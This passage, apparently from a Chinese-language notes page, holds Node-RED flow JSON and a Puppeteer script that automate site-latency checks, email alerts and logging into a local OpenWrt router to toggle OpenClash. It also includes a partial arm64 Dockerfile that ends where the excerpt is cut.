\u0026#34;x\u0026#34;: 790, \u0026#34;y\u0026#34;: 480, \u0026#34;wires\u0026#34;: [ [\u0026#34;http-check\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;success-path\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;正常状态\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;payload\u0026#34;, \u0026#34;targetType\u0026#34;: \u0026#34;msg\u0026#34;, \u0026#34;statusVal\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;statusType\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;x\u0026#34;: 660, \u0026#34;y\u0026#34;: 440, \u0026#34;wires\u0026#34;: [] }, { \u0026#34;id\u0026#34;: \u0026#34;fail-path\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;异常处理\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;payload\u0026#34;, \u0026#34;targetType\u0026#34;: \u0026#34;msg\u0026#34;, \u0026#34;statusVal\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;statusType\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;x\u0026#34;: 660, \u0026#34;y\u0026#34;: 480, \u0026#34;wires\u0026#34;: [] }, { \u0026#34;id\u0026#34;: \u0026#34;page-open\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-goto\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;打开网页\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;http://127.0.0.1:3500\u0026#34;, \u0026#34;urltype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;waitUntil\u0026#34;: \u0026#34;networkidle0\u0026#34;, \u0026#34;x\u0026#34;: 240, \u0026#34;y\u0026#34;: 680, \u0026#34;wires\u0026#34;: [ [\u0026#34;wait-element\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;wait-element\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-waitFor\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;等待元素加载\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;.proxies-speed-test\u0026#34;, \u0026#34;selectortype\u0026#34;: \u0026#34;global\u0026#34;, \u0026#34;x\u0026#34;: 440, \u0026#34;y\u0026#34;: 680, \u0026#34;wires\u0026#34;: [ [\u0026#34;click-element\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;click-element\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-click\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;.proxies-speed-test\u0026#34;, \u0026#34;button\u0026#34;: \u0026#34;left\u0026#34;, \u0026#34;clickCount\u0026#34;: 1, \u0026#34;delay\u0026#34;: 0, \u0026#34;name\u0026#34;: \u0026#34;点击元素\u0026#34;, \u0026#34;x\u0026#34;: 600, \u0026#34;y\u0026#34;: 680, \u0026#34;wires\u0026#34;: [ [\u0026#34;close-browser\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;close-browser\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-browser-close\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;关闭浏览器\u0026#34;, \u0026#34;x\u0026#34;: 770, \u0026#34;y\u0026#34;: 680, \u0026#34;wires\u0026#34;: [ [\u0026#34;debug-output\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;debug-output\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;调试输出\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;targetType\u0026#34;: \u0026#34;full\u0026#34;, \u0026#34;statusVal\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;statusType\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;x\u0026#34;: 940, \u0026#34;y\u0026#34;: 680, \u0026#34;wires\u0026#34;: [] }, { \u0026#34;id\u0026#34;: \u0026#34;browser-launch\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-browser-launch\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;timeout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;slowMo\u0026#34;: 0, \u0026#34;headless\u0026#34;: false, \u0026#34;debugport\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;devtools\u0026#34;: false, \u0026#34;cookies\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;启动浏览器\u0026#34;, \u0026#34;executablePath\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;arguments\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;x\u0026#34;: 230, \u0026#34;y\u0026#34;: 600, \u0026#34;wires\u0026#34;: [ [\u0026#34;page-open\u0026#34;] ] } ] node发邮件通知 [{\u0026#34;id\u0026#34;:\u0026#34;a25be59a7ed0de56\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;function\u0026#34;,\u0026#34;z\u0026#34;:\u0026#34;aa8c759f7ff9a79d\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;构造邮件\u0026#34;,\u0026#34;func\u0026#34;:\u0026#34;msg.payload = \\\u0026#34;1你的服务已经挂了，这是通过 Node-RED 发送的。\\\u0026#34;;\\nmsg.topic = \\\u0026#34;1服务GG，来自 Node-RED 的邮件\\\u0026#34;;\\nmsg.to = \\\u0026#34;a1@ixgmail.xyz\\\u0026#34;;\\nreturn msg;\u0026#34;,\u0026#34;outputs\u0026#34;:1,\u0026#34;timeout\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;noerr\u0026#34;:0,\u0026#34;initialize\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;finalize\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;libs\u0026#34;:[],\u0026#34;x\u0026#34;:760,\u0026#34;y\u0026#34;:2380,\u0026#34;wires\u0026#34;:[[\u0026#34;369447a5450388b7\u0026#34;]]},{\u0026#34;id\u0026#34;:\u0026#34;369447a5450388b7\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;e-mail\u0026#34;,\u0026#34;z\u0026#34;:\u0026#34;aa8c759f7ff9a79d\u0026#34;,\u0026#34;server\u0026#34;:\u0026#34;smtp.qq.com\u0026#34;,\u0026#34;port\u0026#34;:\u0026#34;465\u0026#34;,\u0026#34;authtype\u0026#34;:\u0026#34;BASIC\u0026#34;,\u0026#34;saslformat\u0026#34;:false,\u0026#34;token\u0026#34;:\u0026#34;oauth2Response.access_token\u0026#34;,\u0026#34;secure\u0026#34;:true,\u0026#34;tls\u0026#34;:false,\u0026#34;name\u0026#34;:\u0026#34;a1@ixgmail.xyz\u0026#34;,\u0026#34;dname\u0026#34;:\u0026#34;发送邮件-stmp\u0026#34;,\u0026#34;x\u0026#34;:990,\u0026#34;y\u0026#34;:2380,\u0026#34;wires\u0026#34;:[]}] nodered 邮件 节点 node-red-node-email or node-red-node-email-variable : e-mail\n检查时间 [ { \u0026#34;id\u0026#34;: \u0026#34;1a-open-site\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;inject\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;fc822972c0e398dc\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Start\u0026#34;, \u0026#34;props\u0026#34;: [], \u0026#34;repeat\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;crontab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;once\u0026#34;: false, \u0026#34;onceDelay\u0026#34;: 0.1, \u0026#34;topic\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;payloadType\u0026#34;: \u0026#34;date\u0026#34;, \u0026#34;x\u0026#34;: 1430, \u0026#34;y\u0026#34;: 380, \u0026#34;wires\u0026#34;: [ [ \u0026#34;2a-exec-curl\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;2a-exec-curl\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;exec\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;fc822972c0e398dc\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;curl -o /dev/null -s -w %{time_total} https://www.youtube.com\u0026#34;, \u0026#34;addpay\u0026#34;: false, \u0026#34;append\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;useSpawn\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;timer\u0026#34;: \u0026#34;10\u0026#34;, \u0026#34;winHide\u0026#34;: false, \u0026#34;oldrc\u0026#34;: false, \u0026#34;name\u0026#34;: \u0026#34;load youtube\u0026#34;, \u0026#34;x\u0026#34;: 1620, \u0026#34;y\u0026#34;: 380, \u0026#34;wires\u0026#34;: [ [ \u0026#34;3a-check-time\u0026#34; ], [], [] ] }, { \u0026#34;id\u0026#34;: \u0026#34;3a-check-time\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;fc822972c0e398dc\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;检查时间\u0026#34;, \u0026#34;func\u0026#34;: \u0026#34;// msg.payload 是字符串时间，例如 \\\u0026#34;2.542\\\u0026#34;\\nconst time = parseFloat(msg.payload);\\nmsg.loadTime = time.toFixed(3);\\n\\nif (time \u0026gt; 3) {\\n msg.payload = `加载耗时 ${msg.loadTime} 秒，超出限制`;\\n return [msg, null]; // 到流程1\\n} else {\\n msg.payload = \\\u0026#34;正常\\\u0026#34;;\\n return [null, msg]; // 到流程2\\n}\u0026#34;, \u0026#34;outputs\u0026#34;: 2, \u0026#34;timeout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;noerr\u0026#34;: 0, \u0026#34;initialize\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;finalize\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;libs\u0026#34;: [], \u0026#34;x\u0026#34;: 1800, \u0026#34;y\u0026#34;: 380, \u0026#34;wires\u0026#34;: [ [ \u0026#34;4a-flow1\u0026#34; ], [ \u0026#34;5a-flow2\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;4a-flow1\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;fc822972c0e398dc\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;流程1：超时处理\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;payload\u0026#34;, \u0026#34;targetType\u0026#34;: \u0026#34;msg\u0026#34;, \u0026#34;statusVal\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;statusType\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;x\u0026#34;: 2050, \u0026#34;y\u0026#34;: 280, \u0026#34;wires\u0026#34;: [] }, { \u0026#34;id\u0026#34;: \u0026#34;5a-flow2\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;fc822972c0e398dc\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;流程2：正常处理\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;payload\u0026#34;, \u0026#34;targetType\u0026#34;: \u0026#34;msg\u0026#34;, \u0026#34;statusVal\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;statusType\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;x\u0026#34;: 2070, \u0026#34;y\u0026#34;: 380, \u0026#34;wires\u0026#34;: [] } ] 异常 catch处理 [ { \u0026#34;id\u0026#34;: \u0026#34;http_test\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;http request\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;1a1b2c3d4e5f6g7h\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;请求一个失效网址\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;ret\u0026#34;: \u0026#34;txt\u0026#34;, \u0026#34;paytoqs\u0026#34;: \u0026#34;ignore\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://example.invalid/test\u0026#34;, \u0026#34;tls\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;persist\u0026#34;: false, \u0026#34;proxy\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;insecureHTTPParser\u0026#34;: false, \u0026#34;authType\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;senderr\u0026#34;: false, \u0026#34;headers\u0026#34;: [], \u0026#34;x\u0026#34;: 350, \u0026#34;y\u0026#34;: 140, \u0026#34;wires\u0026#34;: [ [ \u0026#34;debug_success\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;inject_trigger\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;inject\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;1a1b2c3d4e5f6g7h\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;手动触发\u0026#34;, \u0026#34;props\u0026#34;: [], \u0026#34;repeat\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;crontab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;once\u0026#34;: false, \u0026#34;onceDelay\u0026#34;: 0.1, \u0026#34;topic\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;x\u0026#34;: 150, \u0026#34;y\u0026#34;: 140, \u0026#34;wires\u0026#34;: [ [ \u0026#34;http_test\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;debug_success\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;1a1b2c3d4e5f6g7h\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;请求成功输出\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;payload\u0026#34;, \u0026#34;targetType\u0026#34;: \u0026#34;msg\u0026#34;, \u0026#34;statusVal\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;statusType\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;x\u0026#34;: 580, \u0026#34;y\u0026#34;: 140, \u0026#34;wires\u0026#34;: [] }, { \u0026#34;id\u0026#34;: \u0026#34;catch_error\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;catch\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;1a1b2c3d4e5f6g7h\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;捕获异常\u0026#34;, \u0026#34;scope\u0026#34;: [ \u0026#34;http_test\u0026#34; ], \u0026#34;uncaught\u0026#34;: false, \u0026#34;x\u0026#34;: 160, \u0026#34;y\u0026#34;: 240, \u0026#34;wires\u0026#34;: [ [ \u0026#34;debug_error\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;debug_error\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;1a1b2c3d4e5f6g7h\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;错误信息输出\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;targetType\u0026#34;: \u0026#34;full\u0026#34;, \u0026#34;statusVal\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;statusType\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;x\u0026#34;: 400, \u0026#34;y\u0026#34;: 240, \u0026#34;wires\u0026#34;: [] } ] node Puppeteer npm install puppeteer\n//putteper.js node const puppeteer = require(\u0026#39;puppeteer\u0026#39;); (async () =\u0026gt; { let browser; try { browser = await puppeteer.launch({ headless: false, // 可视化模式便于调试 args: [\u0026#39;--ignore-certificate-errors\u0026#39;] // 忽略证书错误 }); const page = await browser.newPage(); // 增加全局超时设置 await page.setDefaultNavigationTimeout(60000); // 60秒超时[2](@ref) await page.setDefaultTimeout(30000); // 1. 登录页面 console.log(\u0026#39;🚀 正在打开登录页面...\u0026#39;); console.log(\u0026#39;📄 当前页面:\u0026#39;, page.url()); // 1. 打开登录页面 await page.goto(\u0026#39;http://192.168.80.2/cgi-bin/luci/\u0026#39;, { waitUntil: \u0026#39;networkidle2\u0026#39; }); // 2. 输入密码并点击“Apply”按钮 await page.click(\u0026#39;#cbi-input-password\u0026#39;); // 点击密码输入框 await page.keyboard.type(\u0026#39;password\u0026#39;); // 输入密码 await page.click(\u0026#39;.cbi-button-apply\u0026#39;); // 点击应用按钮 await page.waitForNavigation({ waitUntil: \u0026#39;networkidle2\u0026#39; }); console.log(\u0026#39;📄 当前页面:\u0026#39;, page.url()); console.log(\u0026#39;✅ 登录成功! 当前页面:\u0026#39;, page.url()); // 3. 跳转到OpenClash console.log(\u0026#39;🔄 正在跳转到OpenClash页面...\u0026#39;); await page.goto(\u0026#39;http://192.168.80.2/cgi-bin/luci/admin/services/openclash/client\u0026#39;, { waitUntil: \u0026#39;networkidle2\u0026#39;, timeout: 60000 }); console.log(\u0026#39;📡 当前页面:\u0026#39;, page.url()); await page.click(\u0026#39;[id=\u0026#34;cbid.table.1.enable\u0026#34;]\u0026#39;); console.log(\u0026#39;📡 当前页面:\u0026#39;, page.url()); console.log(\u0026#39;🎉 操作完成! 当前页面:\u0026#39;, page.url()); } catch (err) { console.error(\u0026#39;❌ 自动化脚本出错：\u0026#39;, err); } finally { if (browser) { console.log(\u0026#39;⏳ 等待10秒后关闭浏览器...\u0026#39;); await new Promise(resolve =\u0026gt; setTimeout(resolve, 10000)); await browser.close(); console.log(\u0026#39;🛑 浏览器已关闭\u0026#39;); } } })(); flowjson [ { \u0026#34;id\u0026#34;: \u0026#34;0963fdad.6f06d\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;tab\u0026#34;, \u0026#34;label\u0026#34;: \u0026#34;luci_automation\u0026#34;, \u0026#34;disabled\u0026#34;: false, \u0026#34;info\u0026#34;: \u0026#34;\u0026#34; }, { \u0026#34;id\u0026#34;: \u0026#34;bb2a9f7e.afba8\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;inject\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;0963fdad.6f06d\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;props\u0026#34;: [ { \u0026#34;p\u0026#34;: \u0026#34;payload\u0026#34; } ], \u0026#34;topic\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;payload\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;payloadType\u0026#34;: \u0026#34;date\u0026#34;, \u0026#34;repeat\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;crontab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;once\u0026#34;: false, \u0026#34;onceDelay\u0026#34;: 0.1, \u0026#34;x\u0026#34;: 150, \u0026#34;y\u0026#34;: 100, \u0026#34;wires\u0026#34;: [ [ \u0026#34;34ad8130.b0def\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;34ad8130.b0def\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;exec\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;0963fdad.6f06d\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;node /home/user/luci_automation.js\u0026#34;, \u0026#34;addpay\u0026#34;: false, \u0026#34;append\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;useSpawn\u0026#34;: false, \u0026#34;timer\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;oldrc\u0026#34;: false, \u0026#34;name\u0026#34;: \u0026#34;执行 Puppeteer 脚本\u0026#34;, \u0026#34;x\u0026#34;: 350, \u0026#34;y\u0026#34;: 100, \u0026#34;wires\u0026#34;: [ [ \u0026#34;d53b874c.af928\u0026#34; ], [], [] ] }, { \u0026#34;id\u0026#34;: \u0026#34;d53b874c.af928\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;0963fdad.6f06d\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;调试输出\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;x\u0026#34;: 550, \u0026#34;y\u0026#34;: 100, \u0026#34;wires\u0026#34;: [] } ] 使用 Node-RED 的 Inject 节点触发流程，通过 Exec 节点执行外部 Puppeteer 脚本，最后用 Debug 节点查看输出结果。示，将 Inject 节点与 Exec 节点连接，Exec 节点的三个输出分别对应标准输出、标准错误和返回码\nExec 节点的命令配置为执行 Node 脚本（如 node /home/user/luci_automation.js），注入触发后即可启动该脚本。\n如果是win环境则 \u0026ldquo;command\u0026rdquo; 为 node C:\\Users\\Administrator\\pu2.js\nPt文档 https://puppeteer.bootcss.com/api\n子流程 [ { \u0026#34;id\u0026#34;: \u0026#34;e87bd785519637ad\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;subflow\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;检测加载\u0026#34;, \u0026#34;info\u0026#34;: \u0026#34;将输入数值加倍后返回\u0026#34;, \u0026#34;category\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;in\u0026#34;: [ { \u0026#34;x\u0026#34;: 340, \u0026#34;y\u0026#34;: 600, \u0026#34;wires\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;3c5f4788b1640dab\u0026#34; } ] } ], \u0026#34;out\u0026#34;: [ { \u0026#34;x\u0026#34;: 960, \u0026#34;y\u0026#34;: 420, \u0026#34;wires\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;d236723173d88df5\u0026#34;, \u0026#34;port\u0026#34;: 0 } ] }, { \u0026#34;x\u0026#34;: 1020, \u0026#34;y\u0026#34;: 720, \u0026#34;wires\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;d236723173d88df5\u0026#34;, \u0026#34;port\u0026#34;: 1 } ] } ], \u0026#34;env\u0026#34;: [], \u0026#34;meta\u0026#34;: {}, \u0026#34;color\u0026#34;: \u0026#34;#DDAA99\u0026#34; }, { \u0026#34;id\u0026#34;: \u0026#34;3c5f4788b1640dab\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;exec\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;e87bd785519637ad\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;curl -o /dev/null -s -w %{time_total} https://www.youtube.com\u0026#34;, \u0026#34;addpay\u0026#34;: false, \u0026#34;append\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;useSpawn\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;timer\u0026#34;: \u0026#34;10\u0026#34;, \u0026#34;winHide\u0026#34;: false, \u0026#34;oldrc\u0026#34;: false, \u0026#34;name\u0026#34;: \u0026#34;打开UTB\u0026#34;, \u0026#34;x\u0026#34;: 540, \u0026#34;y\u0026#34;: 540, \u0026#34;wires\u0026#34;: [ [ \u0026#34;d236723173d88df5\u0026#34; ], [], [] ] }, { \u0026#34;id\u0026#34;: \u0026#34;d236723173d88df5\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;e87bd785519637ad\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;检查时间\u0026#34;, \u0026#34;func\u0026#34;: \u0026#34;// msg.payload 是字符串时间，例如 \\\u0026#34;2.542\\\u0026#34;\\nconst time = parseFloat(msg.payload);\\nmsg.loadTime = time.toFixed(3);\\n\\nif (time \u0026gt; 3) {\\n msg.payload = `加载耗时 ${msg.loadTime} 秒，超出限制`;\\n return [msg, null]; // 到流程1\\n} else {\\n msg.payload = \\\u0026#34;正常\\\u0026#34;;\\n return [null, msg]; // 到流程2\\n}\u0026#34;, \u0026#34;outputs\u0026#34;: 2, \u0026#34;timeout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;noerr\u0026#34;: 0, \u0026#34;initialize\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;finalize\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;libs\u0026#34;: [], \u0026#34;x\u0026#34;: 740, \u0026#34;y\u0026#34;: 520, \u0026#34;wires\u0026#34;: [ [ \u0026#34;33c70447df0b4947\u0026#34; ], [ \u0026#34;a11d2c4907fdaf7e\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;33c70447df0b4947\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;e87bd785519637ad\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;流程1：超时处理\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;payload\u0026#34;, \u0026#34;targetType\u0026#34;: \u0026#34;msg\u0026#34;, \u0026#34;statusVal\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;statusType\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;x\u0026#34;: 1190, \u0026#34;y\u0026#34;: 520, \u0026#34;wires\u0026#34;: [] }, { \u0026#34;id\u0026#34;: \u0026#34;a11d2c4907fdaf7e\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;e87bd785519637ad\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;流程2：正常处理\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;payload\u0026#34;, \u0026#34;targetType\u0026#34;: \u0026#34;msg\u0026#34;, \u0026#34;statusVal\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;statusType\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;x\u0026#34;: 1210, \u0026#34;y\u0026#34;: 740, \u0026#34;wires\u0026#34;: [] }, { \u0026#34;id\u0026#34;: \u0026#34;f998a1cf6dd8ea6d\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;subflow:e87bd785519637ad\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;32cc419bf139e529\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;x\u0026#34;: 960, \u0026#34;y\u0026#34;: 440, \u0026#34;wires\u0026#34;: [ [ \u0026#34;0593bba71550f495\u0026#34; ], [] ] } ] input / output\narm x64 aarch64 docker 部署 基于debian\nNode.js v22.14.0\nnpm v11.4.1\nNode-RED v4.0.9\nPuppeteer（含 Chromium 及依赖）\nnode puppeteer脚本打开网页进行测试\nDockerfile 在 Dockerfile 中设置 CMD 启动 Node-RED\n用 test-puppeteer.js 在 Docker 启动时 提前运行一次测试脚本\nARM64 / aarch64 适配\nFROM debian:bullseye ENV DEBIAN_FRONTEND=noninteractive ENV PUPPETEER_SKIP_DOWNLOAD=true # 安装系统依赖和 Chromium（arm64 架构） RUN apt-get update \u0026amp;\u0026amp; apt-get install -y \\ curl \\ wget \\ gnupg \\ ca-certificates \\ build-essential \\ python3 \\ chromium \\ libx11-dev \\ libxcomposite1 \\ libxcursor1 \\ libxdamage1 \\ libxi6 \\ libxtst6 \\ libnss3 \\ libxrandr2 \\ libasound2 \\ libatk1.0-0 \\ libatk-bridge2.0-0 \\ libcups2 \\ libdbus-1-3 \\ libdrm2 \\ libgbm1 \\ libgtk-3-0 \\ libxss1 \\ libxshmfence1 \\ libxext6 \\ libxfixes3 \\ xdg-utils \\ fonts-liberation \\ --no-install-recommends \u0026amp;\u0026amp; \\ apt-get clean \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/* # 安装 Node.js v22.14.0 RUN curl -fsSL https://nodejs.org/dist/v22.14.0/node-v22.14.0-linux-arm64.tar.xz -o node.tar.xz 